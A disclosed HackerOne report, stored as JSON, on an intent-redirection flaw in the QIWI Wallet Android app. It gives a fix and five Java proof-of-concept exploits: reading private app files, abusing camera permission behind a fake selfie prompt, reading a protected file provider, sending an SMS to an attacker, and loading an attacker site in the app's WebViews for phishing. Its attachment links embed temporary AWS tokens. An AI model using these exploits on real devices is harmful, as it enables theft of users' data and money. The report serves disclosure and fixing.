@@ -1,0 +1,427 @@
+{
+    "id": 482998,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODI5OTg=",
+    "url": "https://hackerone.com/reports/482998",
+    "title": "[QIWI Wallet] Access to protected app components ",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2019-01-20T22:58:03.837Z",
+    "submitted_at": "2019-01-20T22:58:03.837Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "shell_c0de",
+        "url": "/shell_c0de",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 215,
+        "url": "https://hackerone.com/qiwi",
+        "handle": "qiwi",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "disabled",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "QIWI",
+            "twitter_handle": "QiwiRussia",
+            "website": "https://qiwi.com",
+            "about": "The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank."
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2021-07-06T14:11:11.046Z",
+    "bug_reporter_agreed_on_going_public_at": "2021-07-05T14:36:23.847Z",
+    "team_member_agreed_on_going_public_at": "2021-07-06T14:11:10.895Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Здравствуйте, я хочу сообщить об обнаруженной уязвимости в классе `ru.mw.main.Main`\n\n###Информация о приложении\n\nПриложение: QIWI Кошелек\nИмя пакета: `ru.mw`\nНомер версии: `3.25.0`\nКод версии: `21346`\nАктуальность версии: Последняя\nУязвимый класс: `ru.mw.main.Main`\n\n###Уязвимость\n\nПоскольку активность `ru.mw.Main` экспортирована, можно отправить intent в класс `ru.mw.main.Main` там есть уязвимый метод `onResume()`\n```java\npublic class Main extends QiwiPresenterActivity<a, ru.mw.main.b.a> implements AccountManagerCallback<Bundle>, OnCloseListener, OnQueryTextListener, OnSuggestionListener, ru.mw.authentication.a.a, ru.mw.main.c.a {\n...\npublic void onResume() {\n        super.onResume();\n        Class cls = getClass();\n        StringBuilder stringBuilder = new StringBuilder();\n        stringBuilder.append(\"MAIN: \");\n        stringBuilder.append(Thread.currentThread().getStackTrace()[2].getMethodName());\n        Utils.a(cls, stringBuilder.toString());\n        ((ru.mw.main.b.a) aS_()).a();\n        CharSequence stringExtra = getIntent().getStringExtra(FCMIntentHandlerActivity.b);\n        Intent intent = (Intent) getIntent().getParcelableExtra(FCMIntentHandlerActivity.c);//NEXT_INTENT\n        if (Utils.a(intent)) {\n            startActivity(intent);//start malicious intent\n        } else if (!TextUtils.isEmpty(stringExtra)) {\n            if (intent != null) {\n                TextDialog.a(stringExtra, intent).a(getSupportFragmentManager(), C());//start malicious intent\n            } else {\n                TextDialog.a(stringExtra).a(getSupportFragmentManager(), C());\n            }\n        }\n\n```\nМетод `onResume()` позволяет запускать intent злоумышленника , с помощью данной уязвимости можно получить доступ к защищённым компонентам приложений такие как активности, контент-провайдеры, которые недоступны для внешних приложений и содержат `android:exported=\"false\"` \n\n###PoC\n**PoC 1 - Чтение файлов в папке /data/data/ru.mw без root**\n```java\n  Intent next = new Intent(\"android.intent.action.VIEW\", Uri.parse(\"qiwi://promo.web?url=https://xssvenmo.biz/mer.php\"));\n        next.setClassName(\"ru.mw\",\"ru.mw.WebInfoActivity\");\n        next.putExtra(\"InfoActivity_extra_url\",\"file:///data/data/ru.mw/shared_prefs/ru.mw_preferences.xml\");\n\n        Intent intent = new Intent();\n        intent.setClassName(\"ru.mw\",\"ru.mw.Main\");\n        intent.putExtra(\"gcm_intent\", next);\n        intent.putExtra(\"intent_extra_data_key\",\"45 /ryyhr/nkj\");\n        startActivity(intent);\n```\n**PoC 2 - Get Permission**   `<uses-permission android:name=\"android.permission.CAMERA\"/>`\n```java\n    Intent next =  new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\n        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n        next.putExtra(MediaStore.EXTRA_OUTPUT, Uri.parse(\"content://ru.mw.provider/files/416.jpg\"));\n\n        Intent intent = new Intent();\n        intent.setClassName(\"ru.mw\",\"ru.mw.Main\");\n        intent.putExtra(\"gcm_intent\", next);\n        intent.putExtra(\"gcm_body\", \"Идентификация\\n\\nПодтвердите личность, сделайте селфи!!!!!\");\n        intent.putExtra(\"intent_extra_data_key\",\"45 /ryyhr/nkj\");\n        startActivity(intent);\n```\nВаше приложение разрешает пользоваться камерой другому приложения, которое не имеет на это разрешение. Так же можно вывести уведомление для прохождения идентификации и попросить сделать фотографию от лица вашего приложения, затем сохранить фотографию в защищённый контент-провайдер приложения, все эти действия будет выполнять приложение QIWI кошелёк.\nУязвимость включена в [Google Play Security Reward Program](https://hackerone.com/googleplay) (Раздел 3 «Access to protected app components»)\n**PoC 3 - Получение доступа к защищённому контент-провайдеру приложения**\n```java\n  Intent next =  new Intent(\"android.intent.action.VIEW\");\n        next.setClassName(getPackageName(),getPackageName()+\".TheftData\");\n        next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\n        next.setData(Uri.parse(\"content://ru.mw.provider/files/416.jpg\"));\n        next.putExtra(\"keepAliveActivity\",true);\n        Intent intent = new Intent();\n        intent.setClassName(\"ru.mw\",\"ru.mw.Main\");\n        intent.putExtra(\"gcm_intent\", next);\n        intent.putExtra(\"gcm_body\", \"Получить доступ к защищённому провайдеру приложения?\");\n        intent.putExtra(\"intent_extra_data_key\",\"45 /ryyhr/nkj\");\n        startActivity(intent);\n```\nС помощью данной уязвимость злоумышленник может получить доступ к провайдеру `android.support.v4.content.FileProvider` и его файлам. В качестве примера, я разрешаю вредоносному приложению прочитать фотографию, которая была сделана ранее (см. PoC 2) и сохранена в контент-провайдере.\nF409689\nF409714\n**PoC 4 - Отправка SMS для подтверждения перевода**\n```java\n Intent next =  new Intent(\"android.intent.action.VIEW\");\n        next.setData(Uri.parse(\"smsto:QIWIWallet\"));\n        next.putExtra(\"sms_body\", \"HackerOne\");\n        Intent intent = new Intent();\n        intent.setClassName(\"ru.mw\",\"ru.mw.Main\");\n        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION\n                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION\n                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION\n                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);\n        intent.putExtra(\"gcm_intent\", next);\n        intent.putExtra(\"gcm_body\", \"Подтвердите платеж\\n\\nМы отправили SMS, подтвердите отправку платежа, ответив на него\");\n        intent.putExtra(\"intent_extra_data_key\",\"45 /ryyhr/nkj\");\n        startActivity(intent);\n```\nВ приложении QIWI Кошелек есть функционал при котором требуется отправить sms на определённый номер чтобы подтвердить перевод. Поскольку после нажатия кнопки подтверждения в `TextDialog` отправляется Intent то можно заставить пользователя отправить sms на номер злоумышленника.\nF409690\n**PoC 5 - Открытие WebView (Theft of insecure private data)**\n```java\n  Intent next = new Intent(\"ru.mw.action.VIEW_WEB_PAGE\", Uri.parse(\"https://xssvenmo.biz/qiwi\"));\n        next.setClassName(\"ru.mw\",\"ru.mw.WebViewActivity\");\n        Intent intent = new Intent();\n        intent.setClassName(\"ru.mw\",\"ru.mw.Main\");\n        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION\n                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION\n                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION\n                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);\n        intent.putExtra(\"gcm_intent\", next);\n        intent.putExtra(\"gcm_body\", \"HackerOne\");\n        intent.putExtra(\"intent_extra_data_key\",\"45 /ryyhr/nkj\");\n        startActivity(intent);\n```\nИли\n```java\n     Intent next = new Intent(\"android.intent.action.VIEW\", Uri.parse(\"qiwi://promo.web?url=https://xssvenmo.biz/mer.php\"));\n        next.setClassName(\"ru.mw\",\"ru.mw.WebInfoActivity\");\n        next.putExtra(\"InfoActivity_extra_url\",\"https://xssvenmo.biz/mer.php\");\n\n        Intent intent = new Intent();\n        intent.setClassName(\"ru.mw\",\"ru.mw.Main\");\n        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION\n                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION\n                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION\n                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION|Intent.FLAG_ACTIVITY_NEW_TASK);\n        intent.putExtra(\"gcm_intent\", next);\n        intent.putExtra(\"intent_extra_data_key\",\"45 /ryyhr/nkj\");\n        startActivity(intent);\n```\nВ приложении есть два класса WebView которые эксплуатируются с помощью данной уязвимостью `ru.mw.WebInfoActivity` и `ru.mw.WebViewActivity`\nДанный PoC позволяет заменить контент приложения на свой. В результате пользователь не сможет понять разницу между вашим приложением и контентом злоумышленника. Уязвимость включена в [Google Play Security Reward Program](https://hackerone.com/googleplay) (Раздел 2 «Theft of insecure private data»)\n\n###Воспроизведение уязвимости\nСкачать/Установить: [QIWI Кошелек] (https://play.google.com/store/apps/details?id=ru.mw)\nУстановить Pin-код в приложении QIWI Кошелек\nПредоставить разрешение для камеры вручную: F409713\nСкачать/Установить: {F409686}\nНажимать на кнопки с 1-6, желательно по порядку.\nЕсли приложение QIWI начнёт зависать или PoC не работать, закройте приложение QIWI смахнув его из задач, и нажмите нужную PoC кнопку.\n###Fix\nДля исправления ошибки необходимо добавить проверку intent, а именно поверить имя пакета и класс который собираемся запускать.\n Примерный код правильной проверки:\n```java\nComponentName component = intent.getComponent();\n         if (component == null) {\n             return false;\n         }\n         String className = component.getClassName();\n         for (Object equals : F) {\n             if (className.equals(equals)) {\n                 return true;\n             }\n         }\n ...\n         String package_name = intent.getPackage();\n         if (package_name.equals(string_white_pkg_name)) {\n                 return true;\n             }\n```\n\n## Impact\n\nУязвимость позволяет получить доступ к защищённым компонентам приложения и управлять ими.\nМожно заменить контент приложения.\nМожно получить доступ к файлам приложения.\nМожно воспользоваться разрешением приложения для доступа к функциям, которые требуют прав доступа.\nМожно проводить фишинг атаки.\nМожно программировать `TextDialog`",
+    "weakness": {
+        "id": 75,
+        "name": "Privilege Escalation"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 409686,
+            "file_name": "HunterExploitQIWI.apk",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/409/686/20d58efbe2a3649190144ec5cff0e9cdd7d40bc1/HunterExploitQIWI.apk?response-content-disposition=attachment%3B%20filename%3D%22HunterExploitQIWI.apk%22%3B%20filename%2A%3DUTF-8%27%27HunterExploitQIWI.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070852Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=c6ea06a5fe5ed0802f7e00fb0818b315016d09e88a42741a661047fe198e6807",
+            "file_size": 2511707,
+            "type": "application/zip"
+        },
+        {
+            "id": 409689,
+            "file_name": "PoCHinQ.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/409/689/b161e0d36c1287026f1184625aab33a96490fcae/PoCHinQ.jpg?response-content-disposition=attachment%3B%20filename%3D%22PoCHinQ.jpg%22%3B%20filename%2A%3DUTF-8%27%27PoCHinQ.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070852Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=2d1ca34e7c8e1ce1e2c2f52052d5691964ab02b07fcae47ef8f29dd4e24e4898",
+            "file_size": 109377,
+            "type": "image/jpeg"
+        },
+        {
+            "id": 409690,
+            "file_name": "PoCSMSQiwi.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/409/690/c28d0916b33d5e36d663a45228500e3cb58e6f10/PoCSMSQiwi.jpg?response-content-disposition=attachment%3B%20filename%3D%22PoCSMSQiwi.jpg%22%3B%20filename%2A%3DUTF-8%27%27PoCSMSQiwi.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070852Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=4eff4430c90c57fc83fc7265f425324c4318a4a59d847ab1d581fe98e5895d95",
+            "file_size": 187943,
+            "type": "image/jpeg"
+        },
+        {
+            "id": 409713,
+            "file_name": "GrantPermission.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/409/713/a6aa57a45d61400ccff49d8bab53973c918173d8/GrantPermission.jpg?response-content-disposition=attachment%3B%20filename%3D%22GrantPermission.jpg%22%3B%20filename%2A%3DUTF-8%27%27GrantPermission.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070852Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=99afc5250d4c03dfe21c7db635b052f4ad6862107179d9a18fe3919e0112b12b",
+            "file_size": 76433,
+            "type": "image/jpeg"
+        },
+        {
+            "id": 409714,
+            "file_name": "PoCProvider.jpg",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/409/714/9f0829722057ae23fad6c8b97f1faf441b980136/PoCProvider.jpg?response-content-disposition=attachment%3B%20filename%3D%22PoCProvider.jpg%22%3B%20filename%2A%3DUTF-8%27%27PoCProvider.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070852Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=1f05285d87c6cd545f2b8a7a81557089f87906b75a8572c72d67e9d07ed7df3f",
+            "file_size": 160221,
+            "type": "image/jpeg"
+        }
+    ],
+    "allow_singular_disclosure_at": "2021-08-04T14:36:24.018Z",
